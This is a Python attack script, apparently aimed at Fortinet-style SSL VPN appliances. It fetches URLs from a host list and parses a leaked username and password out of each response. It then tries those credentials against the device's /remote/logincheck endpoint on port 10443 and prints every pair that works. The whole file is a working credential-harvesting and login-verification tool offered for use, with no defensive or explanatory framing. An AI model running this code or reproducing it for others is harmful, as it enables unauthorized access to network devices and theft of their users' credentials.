import sys,os,re,requests
import urllib3, string
urllib3.disable_warnings()
PRINTABLE = set(bytes(string.printable, 'ascii'))
class fortExploit:
    def fortExploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/hosts.txt', 'r').read().splitlines()
        pattern_1 = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*'
        pattern_2 = r'(\:).*'
        a = 0
        while a < len(vulnerable_host):
            try:
                url = vulnerable_host[a]
                session = requests.get(url, verify=False, timeout=5)
                matchIp = re.search(pattern_1, session.text)
                if matchIp is not None:
                    creds = matchIp.group()
                    credz = creds.split('root')
                    user = credz[0]
                    test = user.replace('\x00', ' ')
                    test2 = ' '.join(test.split())
                    credentials = test2.split()
                    user = credentials[1]
                    password = credentials[2]
                    ip = re.search(pattern_1, url)
                    data = {'ajax': '1', 'username':user, 'credential':password}
                    link = "https://"+ ip.group().split(':')[0] + ":10443/remote/logincheck"
                    login = requests.post(url=link,data=data, verify=False)
                    if ('denied' not in login.text) and ('tokeninfo' not in login.text):
                        print("CORRECT Found credentials {}:{} at {}".format(credentials[1],credentials[2],link))

            except AttributeError:
                pass
            except requests.exceptions.ConnectionError:
                pass
            except requests.exceptions.ReadTimeout:
                pass
            except:
                pass
            a += 1